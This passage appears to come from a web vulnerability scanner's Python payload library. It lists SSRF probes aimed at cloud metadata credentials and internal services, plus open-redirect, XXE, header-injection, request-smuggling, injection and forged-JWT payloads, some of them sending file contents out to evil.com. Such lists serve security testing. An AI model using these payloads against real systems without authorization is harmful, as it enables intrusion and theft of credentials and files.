        # ── Alibaba Cloud ──────────────────────────────────────────────────
        "http://100.100.100.200/latest/meta-data/",
        "http://100.100.100.200/latest/meta-data/ram/security-credentials/",
        # ── Kubernetes / container internals ───────────────────────────────
        "http://127.0.0.1:10250/pods",             # Kubelet API
        "http://127.0.0.1:10255/pods",             # Kubelet read-only
        "http://10.0.0.1:10250/pods",
        "https://kubernetes.default.svc/api/v1/namespaces/default/secrets",
        "http://127.0.0.1:2379/version",           # etcd
        "http://127.0.0.1:8500/v1/agent/self",    # Consul
        "http://127.0.0.1:4040/api/tunnels",       # ngrok
        # ── Internal services ──────────────────────────────────────────────
        "http://127.0.0.1/",
        "http://localhost/",
        "http://127.0.0.1:22",
        "http://127.0.0.1:3306",                   # MySQL
        "http://127.0.0.1:6379",                   # Redis
        "http://127.0.0.1:5432",                   # PostgreSQL
        "http://127.0.0.1:27017",                  # MongoDB
        "http://127.0.0.1:9200",                   # Elasticsearch
        "http://127.0.0.1:9200/_cat/indices",
        "http://127.0.0.1:5601",                   # Kibana
        "http://127.0.0.1:8080/admin",
        "http://127.0.0.1:11211/",                 # Memcached
        "http://127.0.0.1:15672/api/overview",     # RabbitMQ
        "http://127.0.0.1:2181",                   # ZooKeeper
        # ── Protocol handlers ──────────────────────────────────────────────
        "file:///etc/passwd",
        "file:///etc/shadow",
        "file:///proc/self/environ",
        "dict://127.0.0.1:6379/INFO",
        "gopher://127.0.0.1:6379/_INFO%0D%0A",
        # ── SSRF bypass techniques ─────────────────────────────────────────
        "http://[::1]/",                           # IPv6 localhost
        "http://2130706433/",                      # Decimal 127.0.0.1
        "http://0x7f000001/",                      # Hex 127.0.0.1
        "http://0177.0.0.1/",                      # Octal 127.0.0.1
        "http://127.1/",                           # Short form
        "http://0/",                               # 0.0.0.0
        "http://127.0.0.1.nip.io/",               # DNS rebinding
        "http://169.254.169.254.nip.io/latest/meta-data/",
        "http://[0:0:0:0:0:ffff:127.0.0.1]/",     # IPv6-mapped IPv4
        "http://spoofed.burpcollaborator.net/",
    ],

    "open_redirect": [
        # ── Core evil.com probes ─────────────────────────────────────────
        "https://evil.com",
        "https://evil.com/",
        "//evil.com",
        "//evil.com/",
        # ── Protocol-relative bypass variants ───────────────────────────
        "///evil.com",
        "////evil.com",
        "\\/\\/evil.com",
        "/\\/evil.com",
        "\\\\evil.com",                         # UNC-style
        "//evil.com\\@trusted.com",
        "/\\\\evil.com",
        "\\/evil.com",
        "/%5Cevil.com",                         # URL-encoded backslash
        "/\\%09/evil.com",                      # Tab in path
        "/\\evil.com",
        # ── Whitelisted domain bypass (subdomain/path tricks) ────────────
        "https://trusted.com.evil.com",         # Subdomain confusion
        "https://evil.com?trusted.com",         # ? tricks parser
        "https://evil.com#trusted.com",         # # anchor
        "https://evil.com/..;/trusted.com",     # Path traversal suffix
        "http://www.yoursite.com@evil.com/",    # @ userinfo
        "https://trusted.com@evil.com",
        "https://trusted.com%40evil.com",
        "//trusted.com@evil.com",
        "https://evil.com%252f@trusted.com",    # Double-encoded /
        "http://www.yoursite.com?evil.com",     # ? treats rest as query
        "http://www.yoursite.com/http://evil.com/",  # Full URL in path
        # ── HTTP Parameter Pollution ─────────────────────────────────────
        "//trusted.com&next=//evil.com",        # HPP: second value wins
        # ── Whitespace and null byte bypass ──────────────────────────────
        "//evil.com%00",                        # Null byte
        "//evil.com%20",                        # Trailing space
        " //evil.com",                          # Leading space
        "\t//evil.com",                         # Leading tab
        "/%0d/evil.com",                        # CR in path
        "/%0a/evil.com",                        # LF in path
        # ── CRLF injection + open redirect combo ────────────────────────
        "%0aLocation:https://evil.com",
        "%0d%0aLocation:https://evil.com",
        "%0d%0aLocation:%20https://evil.com",
        # ── URL scheme variations ────────────────────────────────────────
        "http:evil.com",
        "http:/evil.com",
        "http:\\\\evil.com",
        "https:///evil.com",
        "http:@evil.com",
        "https:evil.com",
        "https:%0aevil.com",
        "HtTpS://evil.com",                    # Mixed case scheme
        # ── javascript: bypass variants ──────────────────────────────────
        "javascript:alert(1)",
        "javascript://evil.com/%0aalert(1)",
        "javascript:void(0)//evil.com",
        "JaVaScRiPt:alert(1)",
        "java%0ascript:alert(1)",              # Newline in scheme
        "java%0d%0ascript%0d%0a:alert(0)",    # CRLF bypass for "javascript" blacklist
        "javascript://%0aalert(document.domain)",
        "javascript:%0aalert(1)",
        # ── data: URI variants ───────────────────────────────────────────
        "data:text/html,<script>alert(1)</script>",
        "data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==",
        # ── URL encoding ─────────────────────────────────────────────────
        "%2F%2Fevil.com",
        "%252F%252Fevil.com",                  # Double-encoded //
        "%252Fevil.com",
        "//evil.com/%2f..",
        # ── Unicode / homograph ──────────────────────────────────────────
        "https://evіl.com",                    # Cyrillic і (U+0456)
        "https://evil。com",                    # Fullwidth period (U+3002)
        "//evil%E3%80%82com",                  # URL-encoded fullwidth period
        "https://evil.c℀.example.com",    # Unicode normalisation ℀ → a/c
        "http://a.com／X.b.com",           # Fullwidth solidus
        # ── Encoded dots ─────────────────────────────────────────────────
        "https://evil%2ecom",
        "https://evil.com%23@trusted.com",
        # ── Meta refresh injection ───────────────────────────────────────
        "0;url=https://evil.com",
        "1;url=https://evil.com",
        "0; url=https://evil.com",
        # ── Relative path / path traversal ───────────────────────────────
        "/redirect?url=/\\evil.com",
        "https://evil.com?trusted.com",
        ".evil.com",
        "..evil.com",
        # ── Auth tricks from RFC 1738 ────────────────────────────────────
        "//user:pass@evil.com",
        "http://trusted.com:80@evil.com/",
        "//evil.com%40trusted.com",            # @ URL-encoded → fools some validators
        # ── Fragment-based bypass ─────────────────────────────────────────
        "https://trusted.com.evil.com/#trusted.com",
        "//evil.com/..",
    ],

    "xxe": [
        # ── Original 5 payloads ──────────────────────────────────────────
        '<?xml version="1.0"?><!DOCTYPE x [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><x>&xxe;</x>',
        '<?xml version="1.0"?><!DOCTYPE x [<!ENTITY xxe SYSTEM "file:///etc/shadow">]><x>&xxe;</x>',
        '<?xml version="1.0"?><!DOCTYPE x [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]><x>&xxe;</x>',
        '<?xml version="1.0"?><!DOCTYPE x [<!ENTITY % xxe SYSTEM "http://evil.com/xxe.dtd"> %xxe;]><x/>',
        '<?xml version="1.0" encoding="utf-8"?><!DOCTYPE foo [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">]><foo>&xxe;</foo>',
        # ── Classic entity — Linux ───────────────────────────────────────
        '<?xml version="1.0"?><!DOCTYPE x [<!ENTITY xxe SYSTEM "file:///etc/hostname">]><x>&xxe;</x>',
        '<?xml version="1.0"?><!DOCTYPE x [<!ENTITY xxe SYSTEM "file:///etc/issue">]><x>&xxe;</x>',
        '<?xml version="1.0"?><!DOCTYPE x [<!ENTITY xxe SYSTEM "file:///proc/self/environ">]><x>&xxe;</x>',
        '<?xml version="1.0"?><!DOCTYPE x [<!ENTITY xxe SYSTEM "file:///proc/version">]><x>&xxe;</x>',
        # ── Classic entity — Windows ─────────────────────────────────────
        '<?xml version="1.0"?><!DOCTYPE x [<!ENTITY xxe SYSTEM "file:///C:/Windows/win.ini">]><x>&xxe;</x>',
        '<?xml version="1.0"?><!DOCTYPE x [<!ENTITY xxe SYSTEM "file:///C:/boot.ini">]><x>&xxe;</x>',
        '<?xml version="1.0"?><!DOCTYPE x [<!ENTITY xxe SYSTEM "file:///C:/Windows/System32/drivers/etc/hosts">]><x>&xxe;</x>',
        # ── Parameter entity exfil (OOB) ─────────────────────────────────
        '<?xml version="1.0"?><!DOCTYPE x [<!ENTITY % file SYSTEM "file:///etc/passwd"><!ENTITY % dtd SYSTEM "http://evil.com/xxe.dtd">%dtd;%send;]><x/>',
        '<?xml version="1.0"?><!DOCTYPE x [<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd"><!ENTITY % dtd SYSTEM "http://evil.com/xxe.dtd">%dtd;]><x/>',
        # ── CDATA exfil (bypass output encoding) ────────────────────────
        '<?xml version="1.0"?><!DOCTYPE x [<!ENTITY % start "<![CDATA["><!ENTITY % file SYSTEM "file:///etc/passwd"><!ENTITY % end "]]>"><!ENTITY % dtd SYSTEM "http://evil.com/cdata.dtd">%dtd;]><x>&all;</x>',
        # ── Error-based XXE (parser error leaks file content) ────────────
        '<?xml version="1.0"?><!DOCTYPE x [<!ENTITY % file SYSTEM "file:///etc/passwd"><!ENTITY % eval "<!ENTITY &#x25; error SYSTEM \'file:///nonexistent/%file;\'>">%eval;%error;]><x/>',
        '<?xml version="1.0"?><!DOCTYPE x [<!ENTITY % file SYSTEM "file:///etc/hostname"><!ENTITY % eval "<!ENTITY &#x25; error SYSTEM \'file:///nonexistent/%file;\'>">%eval;%error;]><x/>',
        # ── XInclude (when you can't control DOCTYPE) ────────────────────
        '<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>',
        '<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///C:/Windows/win.ini"/></foo>',
        # ── SVG XXE (image upload vector) ────────────────────────────────
        '<?xml version="1.0"?><!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><svg xmlns="http://www.w3.org/2000/svg"><text>&xxe;</text></svg>',
        '<?xml version="1.0"?><!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/hostname">]><svg xmlns="http://www.w3.org/2000/svg"><text font-size="16">&xxe;</text></svg>',
        # ── SOAP XXE ─────────────────────────────────────────────────────
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"><soap:Body><foo>&xxe;</foo></soap:Body></soap:Envelope>',
        # ── PHP wrapper vectors ──────────────────────────────────────────
        '<?xml version="1.0"?><!DOCTYPE x [<!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=index.php">]><x>&xxe;</x>',
        '<?xml version="1.0"?><!DOCTYPE x [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=../config.php">]><x>&xxe;</x>',
        '<?xml version="1.0"?><!DOCTYPE x [<!ENTITY xxe SYSTEM "expect://id">]><x>&xxe;</x>',
        # ── Java-specific (jar: protocol, netdoc:) ──────────────────────
        '<?xml version="1.0"?><!DOCTYPE x [<!ENTITY xxe SYSTEM "jar:file:///tmp/evil.jar!/evil.txt">]><x>&xxe;</x>',
        '<?xml version="1.0"?><!DOCTYPE x [<!ENTITY xxe SYSTEM "netdoc:///etc/passwd">]><x>&xxe;</x>',
        '<?xml version="1.0"?><!DOCTYPE x [<!ENTITY xxe SYSTEM "jar:http://evil.com/evil.jar!/config.properties">]><x>&xxe;</x>',
        # ── .NET-specific (UNC path) ─────────────────────────────────────
        '<?xml version="1.0"?><!DOCTYPE x [<!ENTITY xxe SYSTEM "file:////evil.com/share/xxe.txt">]><x>&xxe;</x>',
        '<?xml version="1.0"?><!DOCTYPE x [<!ENTITY xxe SYSTEM "\\\\evil.com\\share\\xxe.txt">]><x>&xxe;</x>',
        # ── Encoding bypass — UTF-7 ─────────────────────────────────────
        '<?xml version="1.0" encoding="UTF-7"?>+ADw-!DOCTYPE x +AFs-+ADw-!ENTITY xxe SYSTEM +ACI-file:///etc/passwd+ACI-+AD4-+AF0-+AD4-+ADw-x+AD4-+ACY-xxe;+ADw-/x+AD4-',
        # ── Encoding bypass — UTF-16 BE ──────────────────────────────────
        '<?xml version="1.0" encoding="UTF-16"?><!DOCTYPE x [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><x>&xxe;</x>',
        # ── Billion laughs DoS detection (small version) ─────────────────
        '<?xml version="1.0"?><!DOCTYPE lolz [<!ENTITY lol "lol"><!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;"><!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;">]><lolz>&lol3;</lolz>',
        # ── DOCTYPE with PUBLIC identifier ───────────────────────────────
        '<?xml version="1.0"?><!DOCTYPE foo PUBLIC "-//OASIS//DTD Entity Resolution XML Catalog V1.0//EN" "http://evil.com/xxe.dtd"><foo/>',
        # ── SSRF via XXE (cloud metadata) ────────────────────────────────
        '<?xml version="1.0"?><!DOCTYPE x [<!ENTITY xxe SYSTEM "http://metadata.google.internal/computeMetadata/v1/">]><x>&xxe;</x>',
        '<?xml version="1.0"?><!DOCTYPE x [<!ENTITY xxe SYSTEM "http://169.254.169.254/metadata/instance?api-version=2021-02-01">]><x>&xxe;</x>',
        '<?xml version="1.0"?><!DOCTYPE x [<!ENTITY xxe SYSTEM "http://100.100.100.200/latest/meta-data/">]><x>&xxe;</x>',
        # ── Recursive entity (parser bomb — gentler) ─────────────────────
        '<?xml version="1.0"?><!DOCTYPE x [<!ENTITY a "a"><!ENTITY b "&a;&a;&a;&a;&a;"><!ENTITY c "&b;&b;&b;&b;&b;">]><x>&c;</x>',
        # ── No-declaration entity (some parsers accept) ──────────────────
        '<!DOCTYPE x [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><x>&xxe;</x>',
    ],

    "header_injection": [
        # Basic CRLF header injection
        "\r\nX-Injected: header",
        "%0d%0aX-Injected: header",
        "%0aX-Injected: header",
        "\nSet-Cookie: evil=1",
        "%0d%0aSet-Cookie: evil=1",
        "\r\nLocation: https://evil.com",
        # HTTP response splitting — inject full HTTP response
        "\r\n\r\nHTTP/1.1 200 OK\r\nContent-Type: text/html\r\n\r\n<html>split</html>",
        "%0d%0a%0d%0aHTTP/1.1 200 OK%0d%0aContent-Type: text/html%0d%0a%0d%0a<html>split</html>",
        # Double CRLF body injection
        "\r\n\r\n<script>alert(1)</script>",
        "%0d%0a%0d%0a<script>alert(1)</script>",
        # Header injection variants
        "\r\nX-Forwarded-For: 127.0.0.1",
        "\r\nHost: evil.com",
        "%0d%0aContent-Length: 0%0d%0a%0d%0a",
        # Unicode line separator / paragraph separator
        "\u2028X-Injected: header",
        "\u2029X-Injected: header",
        # Null byte + CRLF combo
        "\x00\r\nX-Injected: header",
        # Encoded variants
        "%E5%98%8A%E5%98%8DX-Injected: header",  # UTF-8 overlong \r\n
        "%c0%8d%c0%8aX-Injected: header",          # overlong UTF-8 \r\n
    ],

    "crlf_injection": [
        "%0d%0a",
        "%0a",
        "\r\n",
        "%0d%0aSet-Cookie:evil=1",
        "test%0d%0aInjected: header",
        # Additional encoded forms
        "%0d%0a%20",                                # CRLF + space (header folding)
        "%0d%0aTransfer-Encoding:%20chunked",       # response splitting via TE
        "\r\nContent-Type: text/html\r\n\r\nPWNED",  # full body injection
        "%0d%0aX-XSS-Protection:%200",              # disable XSS protection
        "%0d%0aAccess-Control-Allow-Origin:%20*",   # inject permissive CORS
        "%E5%98%8A%E5%98%8D",                       # overlong UTF-8 CRLF
        "%c0%8d%c0%8a",                             # another overlong variant
    ],

    "prototype_pollution": [
        "__proto__[x]=1",
        "constructor.prototype.x=1",
        '{"__proto__": {"isAdmin": true}}',
        '{"constructor": {"prototype": {"isAdmin": true}}}',
        "a[__proto__][isAdmin]=1",
        "__proto__.isAdmin=true",
        "__proto__[polluted]=yes",
        "constructor[prototype][isAdmin]=true",
    ],

    # ── Prototype Pollution via JSON body ─────────────────────────────────────
    # For POST/PUT requests with JSON Content-Type
    "prototype_pollution_body": [
        '{"__proto__": {"polluted": "DAST_PP_CONFIRMED"}}',
        '{"__proto__": {"admin": true}}',
        '{"__proto__": {"isAdmin": true}}',
        '{"constructor": {"prototype": {"polluted": "DAST_PP_CONFIRMED"}}}',
        '{"constructor": {"prototype": {"admin": true}}}',
        '{"__proto__.polluted": "DAST_PP_CONFIRMED"}',
        '{"__proto__.isAdmin": "true"}',
        '{"__proto__": {"toString": "DAST_PP_TOSTRING"}}',
    ],

    "exceptional_conditions": [
        "",                    # empty string
        " " * 10000,           # huge input (10k spaces)
        "\x00",                # null byte
        "\xff\xfe",            # invalid UTF-8 sequence
        "𝕳𝖊𝖑𝖑𝖔",        # special Unicode (mathematical script)
        "-1",                  # negative number
        "9" * 100,             # integer overflow candidate
        "true",                # boolean confusion
        "null",                # null literal
        "undefined",           # JS undefined
        "[]",                  # empty array literal
        "{}",                  # empty object literal
        "<\x00script>",        # null byte in HTML tag
        "NaN",                 # not-a-number
        "Infinity",            # float overflow
    ],

    # ── Buffer Overflow / Memory Corruption ─────────────────────────────
    "buffer_overflow": [
        # Long string payloads (safe sizes — max 64KB per ISC-A1)
        "A" * 1024,            # 1 KB
        "A" * 4096,            # 4 KB
        "A" * 8192,            # 8 KB
        "A" * 16384,           # 16 KB
        "A" * 65536,           # 64 KB
        "B" * 4096,            # different char for pattern matching
        # Format string attacks (C/C++ backend detection)
        "%x" * 50,             # heap leak via format string
        "%n" * 20,             # write-what-where via format string
        "%s" * 50,             # string pointer dereference
        "%p" * 50,             # pointer leak
        "AAAA" + "%08x." * 20, # stack walk
        "%d" * 100,            # integer format leak
        # Integer overflow boundaries
        "2147483647",          # INT_MAX (32-bit)
        "2147483648",          # INT_MAX + 1
        "-2147483649",         # INT_MIN - 1
        "4294967295",          # UINT_MAX (32-bit)
        "4294967296",          # UINT_MAX + 1
        "9223372036854775807", # LONG_MAX (64-bit)
        # Deep nesting (stack exhaustion)
        "{" * 512,             # deeply nested JSON-like
        "[" * 512,             # deeply nested array-like
        "(" * 512,             # deeply nested parens
        # Null byte injection (off-by-one / truncation)
        "A" * 256 + "\x00" + "B" * 256,
        "\x00" * 1024,         # null sled
    ],

    # ── XPath Injection ─────────────────────────────────────────────────
    "xpath_injection": [
        # Boolean-based XPath injection
        "' or '1'='1",
        "' or ''='",
        "' and '1'='1",
        "1' or '1'='1' or '1'='1",
        # Error-based XPath extraction
        "' or 1=1]|//|//*['",
        "' or count(//*)>0 or '1'='1",
        "' or string-length(name(/*))>0 or '1'='1",
        # XPath axis navigation
        "' or //user[1]/password or '1'='1",
        "' or name(/*)='root' or '1'='1",
        "' or //*[contains(.,'admin')] or '1'='1",
        # Authentication bypass
        "admin' or '1'='1",
        "' or 1=1 or ''='",
        "x']|//user/*|//user['x",
        # Node extraction
        "' or substring(//user[1]/password,1,1)='a' or '1'='1",
        "') or ('1'='1",
        "'] | //* | //*['",
    ],

    # ── IDOR / Broken Access Control ─────────────────────────────────────
    # Note: these are STATIC fallback IDs. The _fuzz_idor() method generates
    # dynamic payloads (original_value ± 1) at runtime for numeric params.
    "idor": [
        # ── Numeric ID enumeration ───────────────────────────────────────
        "0",
        "1",
        "2",
        "100",
        "999",
        "1000",
        "9999",
        "-1",
        "00",                                   # Leading zero
        "01",
        # ── UUID guessing (common test values) ───────────────────────────
        "00000000-0000-0000-0000-000000000000",  # Nil UUID
        "11111111-1111-1111-1111-111111111111",
        # ── String ID manipulation ───────────────────────────────────────
        "admin",
        "root",
        "test",
        "guest",
        "user",
        "system",
        "null",
        "undefined",
        # ── Path traversal in ID context ─────────────────────────────────
        "../1",
        "..%2F1",
        "1/../../admin",
    ],

    # ── Mass Assignment (A01/A04) ─────────────────────────────────────────
    "mass_assignment": [
        # JSON-body mass assignment (for application/json endpoints)
        '{"isAdmin": true}',
        '{"role": "admin"}',
        '{"verified": true}',
        '{"active": true, "role": "admin"}',
        '{"credits": 99999}',
        '{"balance": 99999}',
        '{"is_superuser": true}',
        '{"_isAdmin": true}',
        '{"admin": 1}',
    ],

    # ── Access Control Bypass Headers ────────────────────────────────────
    "acl_bypass": [
        # ── Path override headers ────────────────────────────────────────
        "/admin",                               # X-Original-URL value
        "/admin/",
        "/api/admin",
        "/api/users",
        "/internal",
        "/actuator",
        "/actuator/env",
        "/management",
        "/swagger-ui.html",
        "/graphql",
        "/debug",
        "/console",
        "/../admin",
        "/%2e%2e/admin",
    ],

    # ── HTTP Request Smuggling Probes ──────────────────────────────────────
    # Each entry is a dict with: name, headers (dict), body (str), technique
    # These are NOT flat payload strings — they need structured CL/TE combos.
    # Detection is via status code anomaly, timeout, or response confusion.
    "http_smuggling": [
        # ── CL.TE: Frontend uses Content-Length, backend uses Transfer-Encoding ──
        {"name": "CL.TE basic",
         "technique": "CL.TE",
         "headers": {"Content-Length": "6", "Transfer-Encoding": "chunked"},
         "body": "0\r\n\r\nG"},
        {"name": "CL.TE extended prefix",
         "technique": "CL.TE",
         "headers": {"Content-Length": "11", "Transfer-Encoding": "chunked"},
         "body": "0\r\n\r\nGET / H"},
        {"name": "CL.TE with POST prefix",
         "technique": "CL.TE",
         "headers": {"Content-Length": "13", "Transfer-Encoding": "chunked"},
         "body": "0\r\n\r\nPOST / H"},
        {"name": "CL.TE oversized CL",
         "technique": "CL.TE",
         "headers": {"Content-Length": "100", "Transfer-Encoding": "chunked"},
         "body": "0\r\n\r\n"},
        {"name": "CL.TE zero chunk immediate",
         "technique": "CL.TE",
         "headers": {"Content-Length": "5", "Transfer-Encoding": "chunked"},
         "body": "0\r\n\r\n"},
        # ── TE.CL: Frontend uses Transfer-Encoding, backend uses Content-Length ──
        {"name": "TE.CL basic",
         "technique": "TE.CL",
         "headers": {"Transfer-Encoding": "chunked", "Content-Length": "4"},
         "body": "5c\r\nGPOST / HTTP/1.1\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 15\r\n\r\nx=1\r\n0\r\n\r\n"},
        {"name": "TE.CL short CL",
         "technique": "TE.CL",
         "headers": {"Transfer-Encoding": "chunked", "Content-Length": "3"},
         "body": "1\r\nG\r\n0\r\n\r\n"},
        {"name": "TE.CL method line inject",
         "technique": "TE.CL",
         "headers": {"Transfer-Encoding": "chunked", "Content-Length": "6"},
         "body": "0\r\n\r\nX"},
        {"name": "TE.CL pipeline probe",
         "technique": "TE.CL",
         "headers": {"Transfer-Encoding": "chunked", "Content-Length": "0"},
         "body": "1\r\nZ\r\n0\r\n\r\n"},
        # ── TE.TE: Both use TE, but obfuscation confuses one side ──
        {"name": "TE.TE xchunked",
         "technique": "TE.TE",
         "headers": {"Transfer-Encoding": "xchunked", "Content-Length": "6"},
         "body": "0\r\n\r\nG"},
        {"name": "TE.TE leading space",
         "technique": "TE.TE",
         "headers": {"Transfer-Encoding": " chunked", "Content-Length": "6"},
         "body": "0\r\n\r\nG"},
        {"name": "TE.TE trailing space",
         "technique": "TE.TE",
         "headers": {"Transfer-Encoding": "chunked ", "Content-Length": "6"},
         "body": "0\r\n\r\nG"},
        {"name": "TE.TE tab prefix",
         "technique": "TE.TE",
         "headers": {"Transfer-Encoding": "\tchunked", "Content-Length": "6"},
         "body": "0\r\n\r\nG"},
        {"name": "TE.TE null byte",
         "technique": "TE.TE",
         "headers": {"Transfer-Encoding": "chunked\x00", "Content-Length": "6"},
         "body": "0\r\n\r\nG"},
        {"name": "TE.TE mixed case chunKed",
         "technique": "TE.TE",
         "headers": {"Transfer-Encoding": "chunKed", "Content-Length": "6"},
         "body": "0\r\n\r\nG"},
        {"name": "TE.TE CHUNKED uppercase",
         "technique": "TE.TE",
         "headers": {"Transfer-Encoding": "CHUNKED", "Content-Length": "6"},
         "body": "0\r\n\r\nG"},
        {"name": "TE.TE identity,chunked",
         "technique": "TE.TE",
         "headers": {"Transfer-Encoding": "identity, chunked", "Content-Length": "6"},
         "body": "0\r\n\r\nG"},
        {"name": "TE.TE chunked,identity",
         "technique": "TE.TE",
         "headers": {"Transfer-Encoding": "chunked, identity", "Content-Length": "6"},
         "body": "0\r\n\r\nG"},
        {"name": "TE.TE line folding via comma",
         "technique": "TE.TE",
         "headers": {"Transfer-Encoding": "chunked,", "Content-Length": "6"},
         "body": "0\r\n\r\nG"},
        {"name": "TE.TE vertical tab",
         "technique": "TE.TE",
         "headers": {"Transfer-Encoding": "\x0bchunked", "Content-Length": "6"},
         "body": "0\r\n\r\nG"},
        {"name": "TE.TE double TE via raw socket",
         "technique": "TE.TE",
         "headers": {"Transfer-Encoding": "chunked", "Transfer-encoding": "x"},
         "body": "0\r\n\r\nG"},
        # ── CL.CL: Double Content-Length (proxy uses first, backend uses second) ──
        {"name": "CL.CL double length",
         "technique": "CL.CL",
         "headers": {"Content-Length": "6", "Content-length": "0"},
         "body": "0\r\n\r\nG"},
        {"name": "CL.CL reversed case",
         "technique": "CL.CL",
         "headers": {"Content-length": "0", "Content-Length": "6"},
         "body": "0\r\n\r\nG"},
        # ── Timing-based differential (detect desync via response timing) ──
        {"name": "CL.TE timing probe",
         "technique": "CL.TE_timing",
         "headers": {"Content-Length": "4", "Transfer-Encoding": "chunked"},
         "body": "1\r\nA\r\n0\r\n\r\n"},
        {"name": "TE.CL timing probe",
         "technique": "TE.CL_timing",
         "headers": {"Transfer-Encoding": "chunked", "Content-Length": "6"},
         "body": "0\r\n\r\n"},
    ],

    # ── CSRF Bypass Techniques ─────────────────────────────────────────────
    # Each entry describes a bypass technique to test against forms.
    # The _fuzz_csrf method fetches a form, extracts the token, then
    # resubmits using each bypass technique to see if the server accepts it.
    "csrf": [
        # ── Token manipulation ──────────────────────────────────────────────
        {"name": "Token removal",
         "technique": "token_remove",
         "description": "Submit form with CSRF token field completely removed"},
        {"name": "Empty token",
         "technique": "token_empty",
         "description": "Submit form with CSRF token set to empty string"},
        {"name": "Random token",
         "technique": "token_random",
         "description": "Submit form with a random/invalid CSRF token value"},
        {"name": "Null token",
         "technique": "token_null",
         "description": "Submit form with CSRF token set to literal 'null'"},
        {"name": "Static token reuse",
         "technique": "token_static",
         "description": "Submit form with a hardcoded static token value"},
        {"name": "Short token",
         "technique": "token_short",
         "description": "Submit form with a truncated token (first 4 chars)"},
        # ── Header bypass ───────────────────────────────────────────────────
        {"name": "No Referer header",
         "technique": "no_referer",
         "description": "Submit form without Referer header"},
        {"name": "Wrong Referer",
         "technique": "wrong_referer",
         "description": "Submit form with Referer pointing to attacker domain"},
        {"name": "Null Origin",
         "technique": "null_origin",
         "description": "Submit form with Origin: null header"},
        {"name": "Wrong Origin",
         "technique": "wrong_origin",
         "description": "Submit form with Origin pointing to attacker domain"},
        {"name": "Origin subdomain spoof",
         "technique": "origin_subdomain",
         "description": "Submit form with Origin as subdomain of target"},
        # ── Method override ─────────────────────────────────────────────────
        {"name": "GET method override",
         "technique": "method_get",
         "description": "Convert POST form to GET with params in query string"},
        {"name": "X-HTTP-Method-Override",
         "technique": "method_override_header",
         "description": "POST with X-HTTP-Method-Override: GET header"},
        {"name": "_method=GET override",
         "technique": "method_override_param",
         "description": "Add _method=GET parameter to POST body"},
        # ── Content-Type bypass ─────────────────────────────────────────────
        {"name": "text/plain Content-Type",
         "technique": "content_type_plain",
         "description": "Submit with text/plain (bypasses CORS preflight)"},
        {"name": "multipart/form-data",
         "technique": "content_type_multipart",
         "description": "Submit as multipart/form-data instead of urlencoded"},
        # ── Combined bypass ─────────────────────────────────────────────────
        {"name": "Token removal + null Origin",
         "technique": "combo_remove_null_origin",
         "description": "Remove token AND set Origin: null simultaneously"},
        {"name": "Token removal + no Referer + text/plain",
         "technique": "combo_remove_no_referer_plain",
         "description": "Remove token, strip Referer, use text/plain"},
    ],

    # ── LDAP Injection ─────────────────────────────────────────────────────
    "ldap_injection": [
        "*)(objectClass=*)",
        "*)(&", "*)(|", "*()|&'",
        "admin)(|(password=*))",
        "x)(|(uid=*))",
        "*))(|(uid=*))(|(uid=*",
        "*()|%26'", "%2a%29%28%7c",
        "admin)(&(objectClass=*))",
        ")(cn=*))(|(cn=*",
        "*)(uid=*))(|(uid=*",
        "admin)(!(password=*))",
        "x'))(|(uid=*))(|(uid='x",
        ")(department=*))(|(department=*",
        "admin))(|(objectClass=top",
    ],

    # ── Cryptographic Downgrade / HTTPS Bypass (A02) ──────────────────────────
    "crypto_downgrade": [
        "http",              # force HTTP scheme in scheme/protocol params
        "http://",
        "0",                 # disable TLS via flag params (ssl=0, tls=0)
        "false",
        "disable",
        "none",
        "plain",
        "cleartext",
        "insecure",
    ],

    # ── JWT Algorithm Confusion (A07) ────────────────────────────────────────
    # Pre-built JWTs with alg:none and admin=true claims (unsigned tokens)
    # These test if the server verifies the algorithm field
    "jwt_confusion": [
        # alg:none — no signature required (null algorithm bypass)
        "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJhZG1pbiI6dHJ1ZSwic3ViIjoiMSIsImlhdCI6MTcwMDAwMDAwMCwiZXhwIjo5OTk5OTk5OTk5fQ.",
        "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxIiwicm9sZSI6ImFkbWluIiwiaWF0IjoxNzAwMDAwMDAwLCJleHAiOjk5OTk5OTk5OTl9.",
        "eyJhbGciOiJOT05FIiwidHlwIjoiSldUIn0.eyJhZG1pbiI6dHJ1ZSwic3ViIjoiMSJ9.",
        # HS256 signed with weak common secrets
        # secret: "secret"
        "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJhZG1pbiI6dHJ1ZSwic3ViIjoiMSIsImlhdCI6MTcwMDAwMDAwMH0.3VOVQ0mKbCBKqsLjRvDAQ5r0mFJL1RNdtCRhqjJ3GSA",
        # secret: "password"
        "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJhZG1pbiI6dHJ1ZSwic3ViIjoiMSJ9.2AvfIO3rUbWXMplFkRSPHnT5ySR3jfpN-S91xVi4NSU",
        # secret: "" (empty string)
        "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJhZG1pbiI6dHJ1ZSwic3ViIjoiMSJ9.bNslZQkPHbObQ7BbEJOluMoRuH0K6HoGLxFNAVMmjwQ",
        # secret: "changeme"
